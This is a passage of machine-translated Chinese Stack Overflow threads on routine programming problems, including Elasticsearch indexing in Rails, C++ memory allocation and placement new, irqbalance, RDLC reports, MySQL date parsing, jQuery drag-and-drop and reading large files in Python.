  BONSAI_INDEX_NAME = "#{app_name}-#{Rails.env}"
end 
```

在您的模型中添加`index_name`：

```
class Event
  include Mongoid::Document
  include Mongoid::Timestamps 

  include Tire::Model::Search
  include Tire::Model::Callbacks

  index_name BONSAI_INDEX_NAME

  field :name, :type => String
  field :description, :type => String
  field :started_at => Time
  field :ended_at => Time

  def to_indexed_json
    self.as_json
  end
end 
```

然后打开 Rails 控制台`rails c`并运行：

```
1.9.2p290 :001 >Event.create_elasticsearch_index
 => 200 : {"ok":true,"acknowledged":true} 
1.9.2p290 :002 > Tire.index BONSAI_INDEX_NAME
1.9.2p290 :003 >        import Event.all
1.9.2p290 :004?>   refresh
1.9.2p290 :005?> end 
```

你应该看到类似的东西：

```
MONGODB (0ms) ... ['system.namespaces'].find({})
MONGODB (0ms) ... ['events'].find({})
 => #<Tire::Index:0xca8fb18 @name="your-app-name-development",@response=200 : {"ok":true,"_shards":{"total":10,"successful":5,"failed":0}}> 
1.9.2p290 :006 > 
```

现在启动 rails 并重试。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-03T10:13:17.553

... 也可以看看 ：

```
Event.index.import Event.all 
```

这样，您的所有记录都会加载到内存中，序列化为 JSON，然后通过线路发送到 ElasticSearch。这与之前的两个解决方案一样，应该避免“IndexMissingException[[events] missing]”错误。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-25T10:21:11.760

如果您修改配置，可能会发生这种情况。如果您定义了一个，请尝试删除 Tire.configure。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-19T05:10:08.760

你有索引你的事件模型吗？你的场地模型呢？弹性搜索也在寻找场地索引

我有一个 rake 任务来重新索引我的模型

> desc "重新索引事件"
> 任务 :reindex_events => :environment do
> 
> ```
> batch_size = 1000
> count = batch_size
> 
> Event.all.find_in_batches(:batch_size => batch_size) { |objects|
> 
>   puts "Count: " + count.to_s
>   count += batch_size
> 
>   Event.index.import objects
> } 
> ```
> 
> 结尾

# arrays - malloc 具有巨大的多维数组，无法用于神经科学 sim

> ID：10220826
> 
> 赞同：2
> 
> 时间：2012-04-19T02:24:49.827
> 
> 标签：arrays, visual-c++, memory, malloc, multidimensional-array

我正在设置一个非常大的数组来处理原始神经元模拟。为数组分配内存（大约 8-9 Gig）时，New[] 会出错。我能够获得 C 风格的 malloc 来保留内存，但是一旦我尝试分配一个值，我就会得到一个访问冲突读取位置 0xffffffffffffffff。

我正在运行带有 Visual Studio 2010 Professional 的 64 位 Windows 7。我也尝试过使用嵌套循环的 malloc 和 new[] ，它们也崩溃了。

如果 malloc 不可能做到这一点，我还应该考虑什么？我需要能够非常快速地访问大内存空间的东西。谢谢您的考虑。

```
#include "stdafx.h"
#include <iostream>
#include <time.h>
#include <stdlib.h>
#include <iomanip>
#include <locale>
#include <math.h>
using namespace std;

int nRows;
int nCols;
int nDepth;
int nData;

int main()
{
        //unsigned long int brainSize=100;
        //nRows = int(pow(brainSize,0.3333333333333333333333333333))+1;
            nRows=80;
        nCols=nRows; 
        nDepth=nRows;
        nData=2000;

        double brainData = nRows*nCols*nDepth*nData;
        double brainBits = 4*brainData;
        cout.imbue(std::locale(""));
        cout << fixed << "Brain size : " << nRows*nCols*nDepth << " neurons \nBrain integers : " << setprecision(0) << brainData << "\nBrain bits: " << brainBits << endl;

    __int64 ****brain;
    brain =  (__int64 ****)malloc(nRows*nCols*nDepth*nData*sizeof(__int64 ****));
        cout << "Brain initialized.";
        brain [2][2][2][2]=2; // error is here. 
        cout << brain[2][2][2][2];

    int breaker;
    cin >> breaker; //pause
    return 0;

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:28:16.330

有几点需要考虑：

*   您确定要创建 64 位可执行文件吗？只是在运行
*   有多少可用内存（包括物理内存和交换内存）
*   你传递给什么类型`malloc`？确保你使用`size_t`而不是`int`
*   也许[`VirtualAlloc`](http://msdn.microsoft.com/en-us/library/aa366887%28VS.85%29.aspx)会起作用（尽管这会将您的程序限制在 Windows 上）

您可能要考虑改用内存映射文件。您无需自己分配所有内存，而是分配它，但它由文件支持。然后，操作系统会担心确保当您访问它时（您将其视为常规`new`/ `malloc`'d 内存）它可供您使用。如果有足够的物理 RAM 可用，它可能会将整个内容保存在内存中，否则它将根据需要将位分页。

一般来说，内存映射文件会更好地工作，因为它应该始终有效，即使在内存较少的系统上也是如此。并且它将允许更高的内存使用率。当然，您*可能可以*构建自己的缓存方案（将一些内容保存在内存中，将其他内容保存在磁盘上），但操作系统设计人员非常擅长这些事情，因此这可能不是您的主要目标（构建缓存系统）你不妨让操作系统完成它的工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:38:12.913

问题是您要声明一个指向指向 64 位整数指针的指针的指针，而不是 64 位整数的四维数组。当您使用 链取消引用它时`[2][2][2][2]`，编译器会在您刚刚分配的未初始化块中查找指针，尝试取消引用它，然后立即崩溃。

如果四个大小中的至少三个（例如`nRows`、`nColumns`和`nDepth`）是编译时常量，则可以分配`nData`3-D 数组，并使用常规方括号语法来访问元素。如果这是不可能的，您要么不得不忍受指针的开销，要么分配一个“普通”数组并在其中实现自己的寻址方案以使其相信它是 4-D。

PS我在这里默默地假设使用的开销`vector<...>`在你的情况下是禁止的。但是，如果您有足够的内存用于附加指针，我肯定会选择 64 位整数向量的向量：它速度快、可靠且易于使用。

**编辑：**如果四个维度中的三个是常量，您可以这样做：

```
#include <iostream>

const int nRows = 11;
const int nColumns = 13;
const int nDepth = 17;

typedef long long brain_block[nRows][nColumns][nDepth];

int main() {
    int nData = 123;
    brain_block *brain = (brain_block*)malloc(nData*sizeof(brain_block));
    memset(brain, 0, nData*sizeof(brain_block));
    brain[2][2][2][2] = 2;
    std::cout << brain[2][2][2][2] << std::endl;
    free(brain);
} 
```

# linux - 如何在 /proc/interrupts 文件中检查我的 CPU 是否被禁止中断？

> ID：10220832
> 
> 赞同：2
> 
> 时间：2012-04-19T02:26:16.303
> 
> 标签：linux, operating-system, linux-kernel, scheduling, interrupt

我正在使用选项 IRQBALANCE_BANNED_CPUS=3e 运行 irqbalance，这意味着禁止除 cpu0 (111110) 之外的所有内容。现在我想确保它正常工作，但是当我检查文件 /proc/interrupts 时，我到处都看到一堆中断。如果中断 21、22、24 和 35 被禁止，为什么它们会转到其他 cpu？在更改 /etc/default/irqbalance 以包含 IRQBALANCE_BANNED_CPUS=3e 选项后，我确实重新启动了我的机器。我有没有错误地配置任何东西？是 irqbalance 不能正常工作吗？它是否在做它应该做的事情而我无法摆脱那些中断？我可以看到 irqbalance 正在使用 ps -ef 运行。

```
 CPU0       CPU1       CPU2       CPU3       CPU4       CPU5       
   0:         30          0          0          0          0          0   IO-APIC-edge      timer
   1:          2          0          0          0          0          0   IO-APIC-edge      i8042
   6:          3          0          0          0          0          0   IO-APIC-edge      floppy
   8:          1          0          0          0          0          0   IO-APIC-edge      rtc0
   9:          0          0          0          0          0          0   IO-APIC-fasteoi   acpi
  12:          4          0          0          0          0          0   IO-APIC-edge      i8042
  14:      44724          0          0          0          0          0   IO-APIC-edge      ata_piix
  15:          0          0          0          0          0          0   IO-APIC-edge      ata_piix
  18:          0          0          0          0          0          0   IO-APIC-fasteoi   ata_piix
  19:          2          0          0          0          0          0   IO-APIC-fasteoi   ohci1394
  20:          3          0          0          0          0          0   IO-APIC-fasteoi   ehci_hcd:usb2, uhci_hcd:usb3, uhci_hcd:usb6
  21:        197        635         40          0         84          0   IO-APIC-fasteoi   uhci_hcd:usb4, uhci_hcd:usb7, HDA Intel
  22:        344       3506          0      25325          0          0   IO-APIC-fasteoi   ehci_hcd:usb1, uhci_hcd:usb5, uhci_hcd:usb8
  24:        162       1094          0          0          0          0   IO-APIC-fasteoi   nvidia
  35:        174          0       1101          0          0          0   IO-APIC-fasteoi   nvidia
  53:      14925          0          0          0          0          0   PCI-MSI-edge      eth0
 NMI:          0          0          0          0          0          0   Non-maskable interrupts
 LOC:      51553      42038      28305      28788      15486      13981   Local timer interrupts
 SPU:          0          0          0          0          0          0   Spurious interrupts
 PMI:          0          0          0          0          0          0   Performance monitoring interrupts
 PND:          0          0          0          0          0          0   Performance pending work
 RES:       1068       1679        330        136        129        140   Rescheduling interrupts
 CAL:       5151       3746       2015       5438       5439       5437   Function call interrupts
 TLB:       6508       7306       4202       3051       1777       1046   TLB shootdowns
 TRM:          0          0          0          0          0          0   Thermal event interrupts
 THR:          0          0          0          0          0          0   Threshold APIC interrupts
 MCE:          0          0          0          0          0          0   Machine check exceptions
 MCP:          6          6          6          6          6          6   Machine check polls
 ERR:          5
 MIS:          0 
```

EDIT1：好吧，我现在更改为 IRQBALANCE_BANNED_CPUS=1，我得到了同样的结果。看来我的配置不起作用。：（ 但为什么？

```
 CPU0       CPU1       CPU2       CPU3       CPU4       CPU5       
   0:         26          0          0          0          0          0   IO-APIC-edge      timer
   1:          2          0          0          0          0          0   IO-APIC-edge      i8042
   6:          3          0          0          0          0          0   IO-APIC-edge      floppy
   8:          1          0          0          0          0          0   IO-APIC-edge      rtc0
   9:          0          0          0          0          0          0   IO-APIC-fasteoi   acpi
  12:          4          0          0          0          0          0   IO-APIC-edge      i8042
  14:       6912          0          0          0          0          0   IO-APIC-edge      ata_piix
  15:          0          0          0          0          0          0   IO-APIC-edge      ata_piix
  18:          0          0          0          0          0          0   IO-APIC-fasteoi   ata_piix
  19:          2          0          0          0          0          0   IO-APIC-fasteoi   ohci1394
  20:          3          0          0          0          0          0   IO-APIC-fasteoi   ehci_hcd:usb2, uhci_hcd:usb3, uhci_hcd:usb6
  21:        197        290        282          0          0          0   IO-APIC-fasteoi   uhci_hcd:usb4, uhci_hcd:usb7, HDA Intel
  22:        188        372          0          0          0          0   IO-APIC-fasteoi   ehci_hcd:usb1, uhci_hcd:usb5, uhci_hcd:usb8
  24:         67          0          0          0          0          0   IO-APIC-fasteoi   nvidia
  35:         74          0          0          0          0          0   IO-APIC-fasteoi   nvidia
  53:       2369          0          0          0          0          0   PCI-MSI-edge      eth0
 NMI:          0          0          0          0          0          0   Non-maskable interrupts
 LOC:       3626       2764       2321       2364       2043       1168   Local timer interrupts
 SPU:          0          0          0          0          0          0   Spurious interrupts
 PMI:          0          0          0          0          0          0   Performance monitoring interrupts
 PND:          0          0          0          0          0          0   Performance pending work
 RES:        185        188        192        124         77        133   Rescheduling interrupts
 CAL:        214        272        280        273        141        281   Function call interrupts
 TLB:        186        455        251        152        138         73   TLB shootdowns
 TRM:          0          0          0          0          0          0   Thermal event interrupts
 THR:          0          0          0          0          0          0   Threshold APIC interrupts
 MCE:          0          0          0          0          0          0   Machine check exceptions
 MCP:          2          2          2          2          2          2   Machine check polls
 ERR:          5
 MIS:          0 
```

# report - RDLC 报告参数错误，即使已定义

> ID：10220836
> 
> 赞同：1
> 
> 时间：2012-04-19T02:26:40.530
> 
> 标签：report, rdlc

尝试设置 RDLC 报告参数时出现持续错误。该参数在报告中定义，当我尝试以编程方式设置参数时出现此错误。尝试设置此报告中未定义的报告参数“ReportParameter1”

我正在使用的代码是：

```
ReportParameter p1 = new ReportParameter("ReportParameter1", Payments);
rep.SetParameters(new ReportParameter[] { p1 }); 
rep.Refresh(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-17T08:01:47.407

如果您更改报告动态的路径，请记住在更改之前将其重置

```
reportViewer1.Reset(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-09T13:16:22.640

我在使用 vs 2010 Professional 时遇到了同样的问题。但我设法找到了这个问题的答案。这很简单 vs 检查将参数分配给哪个报告并且找不到任何报告，因此它会引发错误。您需要做的是加载报告然后设置参数。

使用顺序如下；

```
List<ReportParameter> parameters = new List<ReportParameter>();
  parameters.Add(new ReportParameter("parameterName1", Parameter1Value));
  parameters.Add(new ReportParameter("parameterName2", Parameter2Value));

  // Specify the report to load
  ReportViewer1.LocalReport.ReportPath = YourReportPath;

  // Set parameters to the specified report
  ReportViewer1.LocalReport.SetParameters(parameters);

  // Load the report
  this.ReportViewer1.RefreshReport(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-30T07:28:26.203

您可以尝试使用此代码。我已将此代码用于我的报告

```
 // Add Parameter if you need
  List<ReportParameter> parameters = new List<ReportParameter>();
  parameters.Add(new ReportParameter("parameterName1", Parameter1Value));
  parameters.Add(new ReportParameter("parameterName2", Parameter2Value));
  ReportViewer1.LocalReport.SetParameters(parameters);
  ReportViewer1.ShowParameterPrompts = false;
  ReportViewer1.ShowPromptAreaButton = false;
  ReportViewer1.LocalReport.Refresh(); 
```

参数名称应该与报告参数相同，我想你已经知道了。

# wordpress - 如何在wordpress中仅将第二级类别添加到侧边栏？

> ID：10220838
> 
> 赞同：0
> 
> 时间：2012-04-19T02:26:51.423
> 
> 标签：wordpress

我只想要：Sub-1.1、Sub-1.2 和 Sub-2.1

猫 1

子 1.1

子 1.2

```
 Sub-1.2.1 
```

猫 2

子 2.1

我不想要 cat 1、cat2 和 Sub-1.2.1

谢谢你。迪内什。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T06:25:34.463

你不能在一个电话中做到这一点。您可以使用以下逻辑

*   获取所有父类
*   遍历所有这些并获取它们的第一级子类别

您可以使用获取所有父类别

```
$parent_cats = get_categories('parent=0'); 
```

然后循环 $parent_cats 列表并使用以下内容获取它的直接孩子

```
$child_cats = get_categories('child_of=' . $parent_cats[$i] . '&parent=' . $parent_cats[$i]); 
```

# c++ - 如何在可能使用placement new的同时创建一个数组

> ID：10220846
> 
> 赞同：5
> 
> 时间：2012-04-19T02:27:32.380
> 
> 标签：c++, memory, memory-management, new-operator, placement-new

我一直致力于创建自定义分配器作为一种有趣的练习/练习，并且在创建数组时遇到了两个潜在问题。对于典型的分配调用，我将使用`malloc`and `placement new`。但是，当我去创建一个数组时，我对应该如何完成感到困惑。这一次，我注意到在某些地方，数组似乎`placement new`可能不安全，例如[here](https://stackoverflow.com/questions/4011577/placement-new-array-alignment)。`placement new`在尝试用于数组时，我也遇到了自己的错误。我会得到错误

> `error C2679: binary '=' : no operator found 它采用'SomeClass *' 类型的右侧操作数（或没有可接受的转换）

我理解错误（我相信），但我更希望通过我的数组构造方法解决错误。我有两个问题

1）分配器如何在不使用的情况下创建数组`new[]`？是`placement new`吗？如果是这样，我上面发布的链接中提到的潜在危险呢？

2）如果我想`placement new`在数组中的每个元素上使用和调用它，为什么会出现上述错误？

```
#include <stdio.h>
#include <new>

class SomeClass{
public:
    SomeClass() {
        printf("Constructed\n");
    }

    ~SomeClass() {
        printf("Destructed\n");
    }
};

void* SomeAllocationFunction(size_t size) {
    return malloc(size);
}

template<typename Type>
Type* SomeArrayAllocationFunction(size_t count){
    Type* mem = (Type*)SomeAllocationFunction(sizeof(Type) * count);

    for(unsigned int i = 0; i < count; ++i)
    {
        mem[i] = new(mem + i) Type();
    }

    return mem; 
}

int main(void){
    SomeClass* t = SomeArrayAllocationFunction<SomeClass>(2);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T04:30:24.870

`mem[i]`有类型`Type&`，`new(mem + i) Type();`有类型`Type*`。这些显然是不兼容的类型，无法分配。我*相信*您可以完全删除分配并且它会解决，仍然为您初始化该位置的内存。

不过，我仍然对实现自己的数组分配器持谨慎态度（例如，自定义分配器`vector`会更明显）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T05:33:30.843

> 1) 分配器如何在不使用 new[] 的情况下创建数组？是新的安置吗？如果是这样，我上面发布的链接中提到的潜在危险呢？

链接中的问题是误解了事情的运作方式。每个实现都有一个实现定义的方法来记录有关已分配数组的信息。单个对象不需要此信息，因为它由客户端通过`delete`.

对于数组，实现必须记录元素计数、要调用的析构函数（如果适用）、元素大小……这些东西通常存储在返回分配的开头，并且实现显然适当地偏移了分配请求的大小. 因此，实际大小是偏移的，以适应这些隐藏值。这就是为什么`malloc(sizeof...)`除非您的分配器进行额外的簿记（顺便说一句，`std::allocator`集合接口带来的），否则它将不起作用。

要正确记录此信息，您可以定义`static void* operator new[]`. 要通过放置将您自己的分配器合并到此方案中，您可以使用以下方法：

```
// quick/dirty/incomplete illustration:
#include <stdio.h>
#include <new>
#include <cstdlib>

class t_allocator {
public:
    t_allocator() {
    }

    ~t_allocator() {
    }

public:
    void* allocate(const size_t& size) {
        return malloc(size);
    }
};

class SomeClass {
public:
    SomeClass() {
        printf("Constructed\n");
    }

    ~SomeClass() {
        printf("Destructed\n");
    }

public:
    static void* operator new[](size_t size, t_allocator& allocator) {
        return allocator.allocate(size);
    }

    /* in case static void* operator new[](size_t size, t_allocator& allocator) throws: */
    static void operator delete[](void* object, t_allocator& allocator) {
        /* ... */
    }

    static void operator delete[](void* object) {
        /* matches t_allocator::allocate */
        free(object);
    }
};

int main(void) {
    t_allocator allocator;
    SomeClass* t(new (allocator) SomeClass[2]);

    delete[] t;
    t = 0;

    return 0;
} 
```

请注意，`operator delete[]`如果您的分配器可能会抛出，您将类似地实现放置。

如果你想让你的分配器做一些簿记，它会变得一团糟。就个人而言，我认为这种情况并没有很好地被语言实现，特别是因为数组初始化没有很好地实现。总会有一个额外的步骤来执行附近的建设或破坏，或者在这种情况下使用一些全球可访问的数据。

> 2）如果我想使用placement new 并在数组中的每个元素上调用它，为什么会出现上述错误？

如果要创建不通过`operator new`/的分配器，则需要显式构造元素`operator new[]`。扩展上面的例子，你会想要一个调用的destroy方法`delete[]`，然后被告知`this`释放/重用内存（而不是`free`上面的使用）。

如果您只是想要一个快速的解决方案，您需要将析构函数、大小和元素计数与分配器或分配器一起使用。在那种情况下，您不使用`new[]`/ `delete[]`。

**编辑**

如果您想自己管理书籍，这是一种方法（可以有很多方向）：

```
#include <cassert>
#include <stdio.h>
#include <new>
#include <cstdlib>

class t_allocator {
public:
  t_allocator() {
  }

  ~t_allocator() {
  }

public:
  /** tracks an array allocation's data. acts as a scope container for the allocation/types. */
  class t_array_record {
  public:
    typedef void (*t_destructor)(void* const);

    template<typename T>
    t_array_record(T*& outObjects, t_allocator& allocator, const size_t& count) : d_mem(allocator.allocate(sizeof(T), count)), d_destructor(t_allocator::t_array_record::Destruct<T>), d_size(sizeof(T)), d_count(count), d_allocator(allocator) {
      assert(this->d_mem);
      /* mind exceptions */
      char* const cptr(reinterpret_cast<char*>(this->d_mem));

      for (size_t idx(0); idx < this->d_count; ++idx) {
        /* assignment not required here: */
        new (&cptr[this->d_size * idx]) T();
      }

      outObjects = reinterpret_cast<T*>(this->d_mem);
    }

    ~t_array_record() {
      assert(this->d_mem);
      char* const cptr(reinterpret_cast<char*>(this->d_mem));

      for (size_t idx(0); idx < this->d_count; ++idx) {
        const size_t element(this->d_count - idx - 1U);
        this->d_destructor(& cptr[this->d_size * element]);
      }

      this->d_allocator.free(this->d_mem);
    }

  private:
    template<typename T>
    static void Destruct(void* const ptr) {
      T* const obj(reinterpret_cast<T*>(ptr));

      obj->~T();
    }

  private:
    void* const d_mem;
    t_destructor d_destructor;
    const size_t d_size;
    const size_t d_count;
    t_allocator& d_allocator;
  public:
    t_array_record(const t_array_record&);
    t_array_record& operator=(const t_array_record&);
  };
public:
  void* allocate(const size_t& size, const size_t& count) {
    return malloc(size * count);
  }

  void free(void* const mem) {
    ::free(mem);
  }
}; 
```

演示：

```
class SomeClass {
public:
  SomeClass() {
    printf("Constructed\n");
  }

  virtual ~SomeClass() {
    printf("Destructed\n");
  }

  virtual void greet() {
    printf("hi: %p\n", this);
  }

private:
  SomeClass(const SomeClass&);
  SomeClass& operator=(const SomeClass&);
};

class SomeDer : public SomeClass {
  static int& N() {
    static int a(0);

    return ++a;
  }

public:
  SomeDer() : d_number(N()) {
    printf("Ctor-%i\n", this->d_number);
  }

  virtual ~SomeDer() {
    printf("~Der%i-", this->d_number);
  }

  virtual void greet() {
    printf("Der%i-", this->d_number);
    SomeClass::greet();
  }

private:
  const int d_number; /* << so we have different sized types in the example */
};

template<typename T>
void TryIt(const size_t& count) {
  t_allocator allocator;

  T* things(0);
  t_allocator::t_array_record record(things, allocator, count);

  for (size_t idx(0); idx < count; ++idx) {
    things[idx].greet();
  }
}

int main() {
  TryIt<SomeClass>(3);
  TryIt<SomeDer>(9);
  return 0;
} 
```

# ios - 对于 iOS，将 ViewController.xib 自定义类更改为另一个类是什么意思？

> ID：10220855
> 
> 赞同：0
> 
> 时间：2012-04-19T02:28:47.913
> 
> 标签：ios, cocoa-touch, uiviewcontroller, uikit

使用 XCode 4.3.2，如果添加了一个新类`TestView`（with`TestView.h`和`.m`added），它是 的子类`UIView`，并且在方法内部绘制东西`drawRect`。为什么文件`ViewController.xib`被点击了，身份检查器也被点击了，而自定义类必须从 更改`UIView`为`TestView`？

这样做是什么意思？如果没有改变怎么办—— in`drawRect`中的代码`TestView.m`仍然可以很容易地调用吗？或者，是否可以将所有代码`TestView.m`移至`ViewController.m`？如果是这样，那怎么做，因为`TestView`继承自`UIView`，但`ViewController`继承自`UIViewController`和可能不会被调用`ViewController`。`drawRect`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T04:08:17.207

自定义绘图的常用方法是实现一个 UIView 子类并实现 drawRect。使该绘图可见的唯一方法是将自定义视图添加到由视图控制器控制但不由视图控制器绘制的视图层次结构中。

xib 描述了用户界面。在 xib 中添加 UIView 子类（如 TestView）会导致该类的实例被分配一个附加到视图层次结构。需要类名才能知道要实例化哪个类（创建一个实例）。

drawRect 是一个 UIView 方法，当系统决定需要绘制部分或全部视图时调用该方法。应用程序不直接调用它。他们实现它并让系统调用它。

ViewControllers 不绘制任何东西，它们只管理视图的层次结构。所以在视图控制器中实现 drawRect 是没有意义的。

# iphone - Horizo ntalAccuracy and desiredAccuracy in location,iphone

> ID：10220856
> 
> 赞同：0
> 
> 时间：2012-04-19T02:29:16.263
> 
> 标签：iphone

之后`didUpdateToLocation`，我的新位置（CLLocation）是

> 新位置 = [37.785834 -122.406417]

然后我正在打印locationManager (CLLocationManager)`horizontalAccuracy`的 newLocation `desiredAccuracy`，它们是

> 水平精度为 5.000000
> 
> 期望精度为 10.000000

我的问题是这些数字是从哪里来的……如果您搬到另一个新位置，它们会发生变化吗？

此外，在我创建和初始化 CLLocationManager 之后，它的期望精度是 -1。再次，-1 是 CLLocationManager 的默认值吗？

请就这些问题给我建议。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T04:52:38.403

它们取决于 CoreLocation 属性desiredAccuracy，这些使它们成为启用的定位机制的功能。您可以使用无线电、wifi、gps 三种机制。您在管理器中要求的准确性越多，您获得的准确度值就越小（如果可能）并且您消耗的电池越多。通常即使您设置使用精度进行导航，您将获得的第一个位置也会具有很大的精度值，因为 gps 信号需要检查卫星并且需要时间。您获得的准确度值越小，您就越接近现实中的某个位置。您为核心 loc 管理器获得的日志只是准确度值的枚举值

[更新]
是的，这些值可能会改变。例如，您正在使用 GPS 获取位置，然后您进入建筑物。GPS在建筑物内不起作用，精度值会根据新的定位机制而变化，如果切换到wifi，您应该会看到300m-30m之间的东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T04:48:59.663

精度会根据许多因素而变化。蜂窝基站信号、GPS 卫星可用性和 wi-fi 访问。负数表示该值不正确，不应使用。您可以在代码中设置所需的准确性，但这不能保证......我希望这会有所帮助。

# c++ - 如何继承构造函数，或者如何调用参数数量未知的构造函数？

> ID：10220859
> 
> 赞同：4
> 
> 时间：2012-04-19T02:30:11.723
> 
> 标签：c++, inheritance, parameters, constructor

我正在尝试编写一个异常类，以便与行为类似于 printf 的构造函数一起使用，例如：

```
class ExcBase
{
    ExcBase(const char *fmt, ...)
    {
        // call things like vsprintf
    }
}; 
```

但是构造的继承在 c++ 中似乎不可用，所以我想编写一个继承类，如：

```
class ExcChild : public ExcBase
{
    ExcChild(const char *fmt, ...)
       : ExcBase(fmt, ...) // XXX: how to pass the trailing parameters to the constructor?
    {
    }
}; 
```

或者我将不得不为所有子类编写相同的构造函数，这太烦人了......

这个问题让我很困扰，我想不出解决这个问题的方法……任何信息都会有很大的帮助……

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T03:06:21.790

如果您不需要在不支持它的旧编译器上编译代码，则可以使用 using 子句继承构造函数（不过，即将推出的 VC++11 将被视为“旧”...）

或者，也许您可​​以将实际的构造工作放在类似 vprintf 的函数中，并让构造函数调用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T03:30:17.067

不要试图在构造函数中完成所有工作。把它分成几块——提供一个函数，以你想要的任何方便的方式构建一个字符串，并将该字符串传递给构造函数。

```
std::string format_string(const char * fmt, ...);

class ExcBase
{
    ExcBase(const std::string & message);
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T03:20:44.640

您可以使用 C++11 元组对其进行模板化——但这是我唯一能想到的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T03:32:28.613

如果您将复杂的工作分离到一个带有 va_list 参数的函数中，您应该能够从每个子构造函数中调用它（您仍然必须为每个子类型实现它）。然后您的重复代码（每个类）将只是声明 va_list，然后调用 va_start、您的新（基本）函数和 va_end。这里有[一个关于这样做的帖子](https://stackoverflow.com/a/205584/174483)。

# php - 升级版本后mysql查询返回空记录

> ID：10220860
> 
> 赞同：0
> 
> 时间：2012-04-19T02:30:28.397
> 
> 标签：php, mysql, sql, database

我已经将我的Mysql版本从Mysql5.0升级到了Mysql5.5，

这是查询返回`null`，但相同的查询在升级之前返回值。

```
SELECT  DATE_FORMAT(DATE_ADD(STR_TO_DATE('2010-04', '%Y-%m'), INTERVAL 2 YEAR),'%Y-%m') 
```

应该返回`2012-04`

我的日期值是`varchar`我想添加 2 年间隔的类型。

有没有其他方法可以实现这一点或请告诉我如何纠正它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:33:15.597

如果格式说明符不是格式字符串输入中的最后一个说明符，Mysql version > 5.0`str_to_date()`有时会返回。`NULL``%D`

您需要应用一些技巧（`%D`在此处指定）。

试试下面：

```
 SELECT DATE_FORMAT(DATE_ADD(STR_TO_DATE('2010-04-01', '%Y-%m-%d'), INTERVAL 1 YEAR),'%Y-%m') 
```

# jquery - 使用 jquery 布局从西窗格中删除中心窗格上的元素时出现问题

> ID：10220861
> 
> 赞同：0
> 
> 时间：2012-04-19T02:30:43.590
> 
> 标签：jquery, jquery-ui, jquery-plugins, drag-and-drop

我正在使用 jquery 布局来布局我的应用程序。[http://layout.jquery-dev.net/demos/complex.html](http://layout.jquery-dev.net/demos/complex.html) 我有一个可以从西窗格拖放到内窗格的元素列表。现在，当我试图拖动任何 li 时，该项目将向后移动，即西窗格向右滚动，节点不会到达中心窗格。我在想这可能是 z-Index 问题，但即使我确实将 zIndex 值设置为最大值（10000），它也不起作用。有什么办法可以使这项工作？

我用来拖放的代码是：

//nodetitle 是与 West Pane 上的 span 关联的类

```
 $(".nodetitle").draggable({
            helper: 'clone',
            zIndex: 2700,
            create: function () {
                var $self = $(self);
            },

            stop: function () {
                var $self = $(self);
            },
            drag: function (event, ui) {
                cursor: 'move';
                helper: 'clone';
            },

            revert: function (event, ui) {
                return !event;
            }

        }); 
```

//treedroppable 是 Inner Pane 中的一个 div id

```
 $('#treedroppable').droppable({
            activeClass: 'ui-state-hover',
            hoverClass: 'ui-state-active',
            drop: function (event, ui) {

                if (ui.draggable.attr('class') == "nodetitle") {

                var droppedWidget = $($(".nodetitle").clone());
                document.write(droppedWidget);

                }

                return true;
            }

        }); 
```

谁能让我知道我在哪里失踪？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-03T21:12:17.527

基本上以下选项需要在可拖动控件上：

```
 helper: 'clone',
                revert: true,
                 appendTo: 'body',
                scroll: false,
                revertDuration: 0,
                zIndex:9999999 
```

关键是 scroll 应该设置为**false**并且 appendTo 应该设置为**body**。

很简单，但我不得不挖掘很多地方才能得到最终答案。

阿尼尔班

# python - 使用 python 解析大型（20GB）文本文件 - 将 2 行读取为 1

> ID：10220862
> 
> 赞同：15
> 
> 时间：2012-04-19T02:30:49.977
> 
> 标签：python, large-files

我正在解析一个 20Gb 文件并将满足特定条件的行输出到另一个文件，但是偶尔 python 会一次读取 2 行并将它们连接起来。

```
inputFileHandle = open(inputFileName, 'r')

row = 0

for line in inputFileHandle:
    row =  row + 1
    if line_meets_condition:
        outputFileHandle.write(line)
    else:
        lstIgnoredRows.append(row) 
```

我检查了源文件中的行尾，它们作为换行符签出（ascii char 10）。提取问题行并单独解析它们可以按预期工作。我在这里遇到了一些 python 限制吗？第一个异常在文件中的位置在 4GB 标记附近。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-04-19T02:53:01.427

快速谷歌搜索“python 读取大于 4gb 的文件”产生了许多结果。请参阅[此处以获取此类示例](http://bugs.python.org/issue1672853) [以及从第一个继承的另一个](http://bugs.python.org/issue1744752)示例。

这是 Python 中的一个错误。

